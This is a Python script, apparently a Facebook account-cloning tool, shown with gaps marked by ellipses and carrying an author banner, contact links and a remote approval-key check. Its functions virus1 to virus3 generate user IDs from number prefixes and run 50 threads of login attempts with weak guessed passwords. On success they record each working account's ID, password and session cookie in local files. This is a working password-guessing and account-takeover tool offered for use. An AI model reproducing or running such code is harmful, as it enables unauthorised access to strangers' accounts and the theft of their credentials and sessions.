#coding★Rayees Khaksaar
#contact★+93765832093
#mr Rayees Khaksaar Tool
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
from os import path
import os,base64,zlib,pip,urllib
print('\n\033[1;37m install modules....\n It will take some seconds...MR Khaksaar..')
os.system('xdg-open https://youtube.com/shorts/2nBGhgIn-yA?si=kzdCPcix2fncvS2x')
...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By Khaksaar ")
...
def menu_apikey():
  ...
  id = "@".join(uuid)
  server = requests.get('https://github.com/Shgsysu/Khaksaar420/apv/main/apv-a').text
  ...
  |__/     |__/|__/|__/  |__/  |__/ \______/                                                                                                                                                   
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : Rayees Khaksaar       │
    │ [✓] GITHUB   : https://github.com/Shgsysu             │
    │ [✓] WHATSAPP : +93765832093        │
    │ [✓] TOOLS    : \033[1;32m GAME ID CLONER  \033[1;37m      │
    │ [✓] VRISON   : \033[1;32m 1.0.9  \033[1;37m               │
    └───────────────────────────────────────┘""")                   
  print("\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
  print("")
  print(" \033[1;32m  THIS TOOLS IS  FREE FIRST\033[1;37m\n")
  print("")
  ...
  os.system('xdg-open https://www.facebook.com/khanullah.amiri.5?mibextid=ZbWKwL')
  print("");time.sleep(2)
  
  try:
    httpCaht = requests.get("https://github.com/Shgsysu/Khaksaar420/apv/main/apv-a").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+93765832093?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+93765832093');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open  https://www.facebook.com/khanullah.amiri.5?mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/shorts/2nBGhgIn-yA?si=kzdCPcix2fncvS2x');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virus1():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','afg123','i love you','i hate you','i have you','i want you']
...
def virus2():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Khaksaar123','i love you','i hate you','i have you','Raziajan cg']
...
def virus3():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশKhaksaar123']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/internal storage/khaksaar', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/internal storage/khaksaar-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [💥] COOKIE : '+coki)
                oks.append(cid)
                open('/internal storage/khaksaar', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
